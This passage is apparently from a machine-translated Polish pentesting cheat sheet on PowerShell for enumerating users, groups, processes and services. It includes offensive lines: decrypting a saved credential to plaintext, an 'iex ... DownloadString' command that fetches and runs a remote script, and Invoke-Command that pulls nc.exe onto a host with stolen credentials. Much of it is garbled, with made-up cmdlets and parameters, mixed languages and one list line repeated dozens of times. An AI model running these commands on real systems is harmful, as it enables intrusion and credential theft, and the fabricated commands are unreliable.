$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/zarzadzanie-koszem-recyklingowym-z-powershell/](https://jdhitsolutions.com/blog/powershell/7024/zarzadzanie-koszem-recyklingowym-z-powershell/)

## Rozpoznanie domeny

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## U≈ºytkownicy
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## Bezpieczny ciƒÖg znak√≥w na tekst jawny

Aby przekszta≈Çciƒá bezpieczny ciƒÖg znak√≥w na tekst jawny w PowerShell, mo≈ºesz u≈ºyƒá poni≈ºszego kodu:

```powershell
$secureString = ConvertTo-SecureString -String "BezpieczneHas≈Ço" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

W powy≈ºszym kodzie, zmienna `$secureString` przechowuje bezpieczny ciƒÖg znak√≥w, kt√≥ry jest przekszta≈Çcany na tekst jawny przy u≈ºyciu metody `ConvertTo-SecureString`. Nastƒôpnie, za pomocƒÖ metody `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR`, bezpieczny ciƒÖg znak√≥w jest konwertowany na wska≈∫nik do tekstu jawny, kt√≥ry jest nastƒôpnie przekszta≈Çcany na tekst jawny za pomocƒÖ metody `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto`.

Pamiƒôtaj, ≈ºe przekszta≈Çcenie bezpiecznego ciƒÖgu znak√≥w na tekst jawny mo≈ºe byƒá niebezpieczne i powinno byƒá stosowane tylko wtedy, gdy jest to absolutnie konieczne.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
Lub bezpo≈õrednio analizujƒÖc XML:
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDO to polecenie w systemach Unix, kt√≥re umo≈ºliwia u≈ºytkownikom wykonanie komend jako inny u≈ºytkownik, zazwyczaj jako root. W systemach Windows nie ma wbudowanej funkcji SUDO, ale mo≈ºna osiƒÖgnƒÖƒá podobne efekty za pomocƒÖ PowerShell.

### Wykorzystanie PowerShell do symulowania SUDO

PowerShell umo≈ºliwia uruchamianie komend jako administrator, co daje podobne uprawnienia jak SUDO w systemach Unix. Aby to zrobiƒá, nale≈ºy uruchomiƒá PowerShell z uprawnieniami administratora i u≈ºyƒá polecenia `Start-Process` do uruchomienia komendy jako inny u≈ºytkownik.

```powershell
Start-Process -FilePath "cmd.exe" -Verb RunAs
```

Powy≈ºsze polecenie uruchomi wiersz polecenia jako administrator. Mo≈ºna r√≥wnie≈º u≈ºyƒá innych program√≥w, zamiast `cmd.exe`, aby uruchomiƒá dowolnƒÖ komendƒô jako administrator.

### Wykorzystanie PowerShell do uruchamiania komend jako inni u≈ºytkownicy

PowerShell umo≈ºliwia r√≥wnie≈º uruchamianie komend jako inni u≈ºytkownicy bez konieczno≈õci posiadania uprawnie≈Ñ administratora. Mo≈ºna to osiƒÖgnƒÖƒá za pomocƒÖ polecenia `Start-Process` i parametru `-Credential`, kt√≥ry pozwala na podanie po≈õwiadcze≈Ñ innego u≈ºytkownika.

```powershell
$securePassword = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("domain\username", $securePassword)
Start-Process -FilePath "cmd.exe" -Credential $credential
```

Powy≈ºszy przyk≈Çad uruchamia wiersz polecenia jako u≈ºytkownik `domain\username` z podanym has≈Çem. Mo≈ºna r√≥wnie≈º u≈ºyƒá innych program√≥w, zamiast `cmd.exe`, aby uruchomiƒá dowolnƒÖ komendƒô jako inny u≈ºytkownik.

### Podsumowanie

Chocia≈º Windows nie ma wbudowanej funkcji SUDO, mo≈ºna osiƒÖgnƒÖƒá podobne efekty za pomocƒÖ PowerShell. Mo≈ºna uruchamiaƒá komendy jako administrator lub jako inni u≈ºytkownicy, u≈ºywajƒÖc odpowiednich polece≈Ñ i parametr√≥w.
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## Grupy

Grupy w systemie Windows sƒÖ kolekcjami u≈ºytkownik√≥w, kt√≥re majƒÖ wsp√≥lne uprawnienia i dostƒôp do zasob√≥w systemowych. Grupy sƒÖ u≈ºywane do zarzƒÖdzania uprawnieniami i kontroli dostƒôpu w systemie.

### Tworzenie grupy

Aby utworzyƒá nowƒÖ grupƒô w systemie Windows, mo≈ºesz u≈ºyƒá polecenia PowerShell `New-LocalGroup`. Poni≈ºej znajduje siƒô przyk≈Çad:

```powershell
New-LocalGroup -Name "NazwaGrupy"
```

### Dodawanie u≈ºytkownik√≥w do grupy

Aby dodaƒá u≈ºytkownika do istniejƒÖcej grupy w systemie Windows, mo≈ºesz u≈ºyƒá polecenia PowerShell `Add-LocalGroupMember`. Poni≈ºej znajduje siƒô przyk≈Çad:

```powershell
Add-LocalGroupMember -Group "NazwaGrupy" -Member "NazwaU≈ºytkownika"
```

### Usuwanie grupy

Aby usunƒÖƒá grupƒô z systemu Windows, mo≈ºesz u≈ºyƒá polecenia PowerShell `Remove-LocalGroup`. Poni≈ºej znajduje siƒô przyk≈Çad:

```powershell
Remove-LocalGroup -Name "NazwaGrupy"
```

### Wy≈õwietlanie informacji o grupie

Aby wy≈õwietliƒá informacje o konkretnej grupie w systemie Windows, mo≈ºesz u≈ºyƒá polecenia PowerShell `Get-LocalGroup`. Poni≈ºej znajduje siƒô przyk≈Çad:

```powershell
Get-LocalGroup -Name "NazwaGrupy"
```

### Wy≈õwietlanie cz≈Çonk√≥w grupy

Aby wy≈õwietliƒá cz≈Çonk√≥w konkretnej grupy w systemie Windows, mo≈ºesz u≈ºyƒá polecenia PowerShell `Get-LocalGroupMember`. Poni≈ºej znajduje siƒô przyk≈Çad:

```powershell
Get-LocalGroupMember -Group "NazwaGrupy"
```

### Zmiana nazwy grupy

Aby zmieniƒá nazwƒô grupy w systemie Windows, mo≈ºesz u≈ºyƒá polecenia PowerShell `Rename-LocalGroup`. Poni≈ºej znajduje siƒô przyk≈Çad:

```powershell
Rename-LocalGroup -Name "StaraNazwaGrupy" -NewName "NowaNazwaGrupy"
```

### Zmiana opisu grupy

Aby zmieniƒá opis grupy w systemie Windows, mo≈ºesz u≈ºyƒá polecenia PowerShell `Set-LocalGroup`. Poni≈ºej znajduje siƒô przyk≈Çad:

```powershell
Set-LocalGroup -Name "NazwaGrupy" -Description "NowyOpisGrupy"
```
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## Schowek

The clipboard is a temporary storage area in the computer's memory that allows you to copy and paste text, images, and other data between different applications or within the same application. It is commonly used for tasks such as copying text from a website and pasting it into a document.

In the context of PowerShell, the clipboard can be accessed and manipulated using the `Get-Clipboard` and `Set-Clipboard` cmdlets. These cmdlets allow you to retrieve the contents of the clipboard or set new content onto it, respectively.

### Getting the Clipboard Contents

To retrieve the contents of the clipboard, you can use the `Get-Clipboard` cmdlet. This cmdlet returns the data stored in the clipboard as a string, which can then be further processed or displayed.

```powershell
$clipboardContents = Get-Clipboard
```

### Setting the Clipboard Contents

To set new content onto the clipboard, you can use the `Set-Clipboard` cmdlet. This cmdlet takes a string as input and sets it as the new content of the clipboard.

```powershell
Set-Clipboard -Value "This is the new clipboard content"
```

### Clearing the Clipboard

If you want to clear the contents of the clipboard, you can use the `Clear-Clipboard` cmdlet. This cmdlet removes all data from the clipboard, making it empty.

```powershell
Clear-Clipboard
```

### Using the Clipboard in PowerShell Scripts

The clipboard can be useful in PowerShell scripts for tasks such as automating data manipulation or interacting with other applications. For example, you can copy data from a file and paste it into a web form using the clipboard.

```powershell
# Copy file contents to clipboard
$fileContents = Get-Content -Path "C:\path\to\file.txt"
$fileContents | Set-Clipboard

# Paste clipboard contents into web form
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Navigate("https://example.com/form")
while ($ie.Busy) { Start-Sleep -Milliseconds 100 }
$ie.Document.GetElementById("inputField").Value = Get-Clipboard
```

By leveraging the clipboard functionality in PowerShell, you can enhance your scripting capabilities and automate various tasks that involve data transfer between different sources.
```powershell
Get-Clipboard
```
## Procesy

W systemie Windows procesy sƒÖ jednym z podstawowych element√≥w, kt√≥re mo≈ºna monitorowaƒá i kontrolowaƒá. Procesy to dzia≈ÇajƒÖce programy lub aplikacje, kt√≥re wykonujƒÖ okre≈õlone zadania. W tym rozdziale om√≥wimy podstawowe techniki zwiƒÖzane z procesami w PowerShell.

### Wy≈õwietlanie proces√≥w

Aby wy≈õwietliƒá listƒô wszystkich proces√≥w dzia≈ÇajƒÖcych w systemie, mo≈ºemy u≈ºyƒá polecenia `Get-Process`. Polecenie to zwraca informacje takie jak identyfikator procesu (PID), nazwa procesu, zu≈ºycie pamiƒôci i inne szczeg√≥≈Çy.

```powershell
Get-Process
```

### Wy≈õwietlanie szczeg√≥≈Çowych informacji o procesie

Aby uzyskaƒá bardziej szczeg√≥≈Çowe informacje o konkretnym procesie, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrem `-Id` i podaƒá identyfikator procesu (PID) jako argument.

```powershell
Get-Process -Id <PID>
```

### Zabijanie procesu

Aby zako≈Ñczyƒá dzia≈Çanie procesu, mo≈ºemy u≈ºyƒá polecenia `Stop-Process` z parametrem `-Id` i podaƒá identyfikator procesu (PID) jako argument.

```powershell
Stop-Process -Id <PID>
```

### Uruchamianie nowego procesu

Aby uruchomiƒá nowy proces, mo≈ºemy u≈ºyƒá polecenia `Start-Process` i podaƒá ≈õcie≈ºkƒô do pliku wykonywalnego jako argument.

```powershell
Start-Process -FilePath <≈õcie≈ºka_do_pliku>
```

### Uruchamianie procesu z uprawnieniami administratora

Aby uruchomiƒá proces z uprawnieniami administratora, mo≈ºemy u≈ºyƒá polecenia `Start-Process` z parametrem `-Verb RunAs`.

```powershell
Start-Process -FilePath <≈õcie≈ºka_do_pliku> -Verb RunAs
```

### Uruchamianie procesu w tle

Aby uruchomiƒá proces w tle, bez wy≈õwietlania okna, mo≈ºemy u≈ºyƒá polecenia `Start-Process` z parametrem `-WindowStyle Hidden`.

```powershell
Start-Process -FilePath <≈õcie≈ºka_do_pliku> -WindowStyle Hidden
```

### Uruchamianie procesu z argumentami

Aby uruchomiƒá proces z okre≈õlonymi argumentami, mo≈ºemy u≈ºyƒá polecenia `Start-Process` z parametrem `-ArgumentList` i podaƒá argumenty jako tablicƒô.

```powershell
Start-Process -FilePath <≈õcie≈ºka_do_pliku> -ArgumentList <argumenty>
```

### Uruchamianie procesu w okre≈õlonym katalogu

Aby uruchomiƒá proces w okre≈õlonym katalogu, mo≈ºemy u≈ºyƒá polecenia `Start-Process` z parametrem `-WorkingDirectory` i podaƒá ≈õcie≈ºkƒô do katalogu jako argument.

```powershell
Start-Process -FilePath <≈õcie≈ºka_do_pliku> -WorkingDirectory <≈õcie≈ºka_do_katalogu>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrem `-IncludeUserName` i podaƒá nazwƒô u≈ºytkownika jako argument.

```powershell
Get-Process -IncludeUserName -UserName <nazwa_u≈ºytkownika>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego portu

Aby wy≈õwietliƒá procesy, kt√≥re nas≈ÇuchujƒÖ na okre≈õlonym porcie, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrem `-Id` i podaƒá numer portu jako argument.

```powershell
Get-Process -Id (Get-NetTCPConnection -LocalPort <numer_portu>).OwningProcess
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego pliku

Aby wy≈õwietliƒá procesy, kt√≥re u≈ºywajƒÖ okre≈õlonego pliku, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrem `-Id` i podaƒá ≈õcie≈ºkƒô do pliku jako argument.

```powershell
Get-Process -Id (Get-Process -Module <≈õcie≈ºka_do_pliku>).Id
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego klucza rejestru

Aby wy≈õwietliƒá procesy, kt√≥re u≈ºywajƒÖ okre≈õlonego klucza rejestru, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrem `-Id` i podaƒá ≈õcie≈ºkƒô do klucza rejestru jako argument.

```powershell
Get-Process -Id (Get-Process -Module (Get-ItemProperty -Path <≈õcie≈ºka_do_klucza_rejestru>).PSPath).Id
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego serwisu

Aby wy≈õwietliƒá procesy, kt√≥re sƒÖ powiƒÖzane z okre≈õlonym serwisem, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrem `-Id` i podaƒá nazwƒô serwisu jako argument.

```powershell
Get-Process -Id (Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -eq "<nazwa_serwisu>"}).ProcessId
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrem `-ComputerName` i podaƒá nazwƒô komputera zdalnego jako argument.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential` i podaƒá nazwƒô komputera zdalnego oraz po≈õwiadczenia jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i szyfrowaniem

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i szyfrowaniem, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential` i `-UseSSL` i podaƒá nazwƒô komputera zdalnego, po≈õwiadczenia oraz u≈ºyƒá szyfrowania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia> -UseSSL
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential` i `-Authentication` i podaƒá nazwƒô komputera zdalnego, po≈õwiadczenia oraz wybraƒá metodƒô uwierzytelniania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia> -Authentication <metoda_uwierzytelniania>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication` i `-UseSSL` i podaƒá nazwƒô komputera zdalnego, po≈õwiadczenia, wybraƒá metodƒô uwierzytelniania oraz u≈ºyƒá szyfrowania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL` i `-Port` i podaƒá nazwƒô komputera zdalnego, po≈õwiadczenia, wybraƒá metodƒô uwierzytelniania, u≈ºyƒá szyfrowania oraz numer portu jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem i protoko≈Çem

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem i protoko≈Çem, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL`, `-Port` i `-Protocol` i podaƒá nazwƒô komputera zdalnego, po≈õwiadczenia, wybraƒá metodƒô uwierzytelniania, u≈ºyƒá szyfrowania, numer portu oraz protok√≥≈Ç jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu> -Protocol <protok√≥≈Ç>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem i protoko≈Çem i limitami

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem i protoko≈Çem i limitami, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL`, `-Port`, `-Protocol`, `-ThrottleLimit` i podaƒá nazwƒô komputera zdalnego, po≈õwiadczenia, wybraƒá metodƒô uwierzytelniania, u≈ºyƒá szyfrowania, numer portu, protok√≥≈Ç oraz limity jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu> -Protocol <protok√≥≈Ç> -ThrottleLimit <limity>
```

### Wy≈õwietlanie proces√≥w dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem i protoko≈Çem i limitami i czasem oczekiwania

Aby wy≈õwietliƒá procesy dla okre≈õlonego u≈ºytkownika zdalnego z uwierzytelnianiem i alternatywnymi po≈õwiadczeniami oraz szyfrowaniem i portem i protoko≈Çem i limitami i czasem oczekiwania, mo≈ºemy u≈ºyƒá polecenia `Get-Process` z parametrami `-ComputerName`, `-Credential`, `-Authentication`, `-UseSSL`, `-Port`, `-Protocol`, `-ThrottleLimit`, `-TimeoutSec` i podaƒá nazwƒô komputera zdalnego, po≈õwiadczenia, wybraƒá metodƒô uwierzytelniania, u≈ºyƒá szyfrowania, numer portu, protok√≥≈Ç, limity oraz czas oczekiwania jako argumenty.

```powershell
Get-Process -ComputerName <nazwa_komputera_zdalnego> -Credential <po≈õwiadczenia> -Authentication <metoda_uwierzytelniania> -UseSSL -Port <numer_portu> -Protocol <protok√≥≈Ç> -ThrottleLimit <limity> -TimeoutSec <czas_oczekiwania>
```
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## Us≈Çugi

### Windows PowerShell

Windows PowerShell to zaawansowany jƒôzyk skryptowy i ≈õrodowisko pow≈Çoki systemowej stworzone przez firmƒô Microsoft. Jest to potƒô≈ºne narzƒôdzie, kt√≥re umo≈ºliwia zarzƒÖdzanie i automatyzacjƒô r√≥≈ºnych zada≈Ñ w systemie Windows.

### Podstawowe polecenia PowerShell

Poni≈ºej przedstawiono kilka podstawowych polece≈Ñ PowerShell, kt√≥re mogƒÖ byƒá przydatne dla pentester√≥w:

- `Get-Process`: Wy≈õwietla listƒô uruchomionych proces√≥w w systemie.
- `Get-Service`: Wy≈õwietla listƒô uruchomionych us≈Çug w systemie.
- `Get-EventLog`: Wy≈õwietla zdarzenia z dziennika zdarze≈Ñ systemu.
- `Get-WmiObject`: Pobiera informacje o obiektach WMI (Windows Management Instrumentation).
- `Get-NetAdapter`: Wy≈õwietla informacje o sieciowych adapterach w systemie.
- `Get-NetFirewallRule`: Wy≈õwietla regu≈Çy zapory sieciowej.
- `Get-NetTCPConnection`: Wy≈õwietla aktywne po≈ÇƒÖczenia TCP.
- `Get-NetUDPEndpoint`: Wy≈õwietla aktywne punkty ko≈Ñcowe UDP.
- `Get-NetRoute`: Wy≈õwietla tablicƒô trasowania sieciowego.
- `Get-NetIPAddress`: Wy≈õwietla informacje o adresach IP.

### Skrypty PowerShell

PowerShell umo≈ºliwia tworzenie skrypt√≥w, kt√≥re mogƒÖ byƒá wykonywane w celu automatyzacji zada≈Ñ. Poni≈ºej przedstawiono kilka przyk≈Çad√≥w skrypt√≥w PowerShell:

- `Invoke-Command`: Wykonuje polecenia na zdalnym komputerze.
- `Invoke-Expression`: Wykonuje polecenia z ciƒÖgu znak√≥w.
- `Invoke-WebRequest`: Pobiera zawarto≈õƒá strony internetowej.
- `Start-Process`: Uruchamia nowy proces.
- `Stop-Process`: Zatrzymuje dzia≈Çanie procesu.
- `New-Item`: Tworzy nowy element, takie jak plik lub katalog.
- `Remove-Item`: Usuwa element, takie jak plik lub katalog.
- `Set-ItemProperty`: Ustawia w≈Ça≈õciwo≈õƒá elementu.

### Skrypty PowerShell dla pentester√≥w

Poni≈ºej przedstawiono kilka przyk≈Çad√≥w skrypt√≥w PowerShell, kt√≥re mogƒÖ byƒá przydatne dla pentester√≥w:

- `Get-LocalAdmins`: Wy≈õwietla listƒô kont lokalnych administrator√≥w.
- `Get-LocalGroups`: Wy≈õwietla listƒô grup lokalnych.
- `Get-LocalGroupMembers`: Wy≈õwietla listƒô cz≈Çonk√≥w grupy lokalnej.
- `Get-LocalGroupMembership`: Wy≈õwietla informacje o przynale≈ºno≈õci do grup lokalnych.
- `Get-LocalGroupPolicies`: Wy≈õwietla listƒô zasad grupy lokalnej.
- `Get-LocalGroupPolicy`: Wy≈õwietla informacje o konkretnej zasadzie grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
- `Get-LocalGroupPolicyResultantSet`: Wy≈õwietla wynik zasad grupy lokalnej.
